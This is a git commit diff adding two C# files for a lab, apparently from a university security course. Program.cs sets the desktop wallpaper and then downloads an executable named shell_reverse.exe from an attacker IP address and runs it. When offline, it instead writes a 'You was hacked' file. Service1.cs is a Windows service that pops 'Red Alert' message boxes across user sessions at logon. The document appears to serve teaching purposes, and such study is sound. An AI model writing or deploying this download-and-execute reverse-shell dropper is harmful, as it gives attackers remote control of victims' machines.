5a21997317361510af96599dfbb0868ea8d5d01a
Phu Nguyen D <phu.nguyenduc@stdio.vn>
2021-04-30 20:14:02 +0700

    + Update Lab 02.

---
+++ Lab 02/BT03/Lab02/Program.cs
@@ -0,0 +1,85 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
+using System.Text;
+
+
+namespace Lab02
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string photo = @"C:\Users\Public\Pictures\Sample Pictures\Lighthouse.jpg"; // picture path
+            DisplayPicture(photo);
+            InternetChecking();
+        }
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool SystemParametersInfo(int uiAction, int uiParam, String pvParam, int fWinIni);
+
+        private const int SPI_SETDESKWALLPAPER = 0x14;
+        private const int SPIF_UPDATEINIFILE = 0x1;
+        private const int SPIF_SENDWININICHANGE = 0x2;
+
+        // Change Desktop wallpaper
+        private static void DisplayPicture(string file_name)
+        {
+            int flags = 0;
+            // Change wallpaper
+            // if fail console error
+            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
+                    0, file_name, flags))
+            {
+                Console.WriteLine("Error");
+            }
+        }
+
+        // Check Internet connection
+        static void InternetChecking()
+        {
+            // Check internet using ping to Google
+            Ping ping = new Ping();
+            PingReply reply = ping.Send("8.8.8.8", 2000);
+
+            // specify path save reverse sell file
+            string desFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+            if (reply.Status == IPStatus.Success) // iff ping success
+            {
+                using (var client = new WebClient()) //download reverse shell from attacker
+                {
+                    try
+                    {
+                        client.DownloadFile("http://192.168.197.133/shell_reverse.exe", desFolder + "\\shell_reverse.exe");
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.StackTrace);
+                        return;
+                    }
+                }
+
+                // run reverse shell after downloaded
+                System.Diagnostics.Process.Start(desFolder + "\\shell_reverse.exe");
+            }
+            else // if don't have Internet
+            {
+                // Create file
+                FileStream stream = new FileStream((desFolder + "\\hacked.txt"), FileMode.OpenOrCreate);
+                StreamWriter writer = new StreamWriter(stream);
+
+                // Write file
+                writer.Write("You was hacked");
+
+                writer.Close();
+                stream.Close();
+            }
+        }
+    }
+}
---
+++ Lab 02/BT04/Service1.cs
@@ -0,0 +1,77 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace Lab02.BT04
+{
+    public partial class Service1 : ServiceBase
+    {
+        public Service1()
+        {
+	    // override thuộc tính để ghi đè hàm session thay đổi
+            this.CanHandleSessionChangeEvent = true;
+            InitializeComponent(); 
+        }
+
+        [DllImport("wtsapi32.dll", SetLastError = true)]
+        static extern void WTSSendMessage(
+            IntPtr hServer,
+            [MarshalAs(UnmanagedType.I4)] int SessionId,
+            String pTitle,
+            [MarshalAs(UnmanagedType.U4)] int TitleLength,
+            String pMessage,
+            [MarshalAs(UnmanagedType.U4)] int MessageLength,
+            [MarshalAs(UnmanagedType.U4)] int Style,
+            [MarshalAs(UnmanagedType.U4)] int Timeout,
+            [MarshalAs(UnmanagedType.U4)] out int pResponse,
+            bool bWait
+        );
+
+        protected override void OnStart(string[] args)
+        {
+        }
+
+        protected override void OnStop()
+        {
+        }
+
+        protected override void OnSessionChange(System.ServiceProcess.SessionChangeDescription changeDescription)
+        {
+            if (changeDescription.Reason == SessionChangeReason.SessionLogon)
+            {
+                // Brute sessionId
+                for (int session = 10; session > 0; --session)
+                {
+                    Thread t = new Thread(() =>
+                    {
+                        try
+                        {
+                            String title = "Red Alert";
+                            String message = "18520165 - 18520333";
+                            int resp;
+                            WTSSendMessage(
+                                IntPtr.Zero, session,
+                                title, title.Length,
+                                message, message.Length,
+                                4, 0, out resp, true
+                            );
+                        }
+                        catch { }
+                    });
+                    t.SetApartmentState(ApartmentState.STA);
+                    t.Start();
+                }
+                base.OnSessionChange(changeDescription);
+            }
+        }
+    }
+
+}
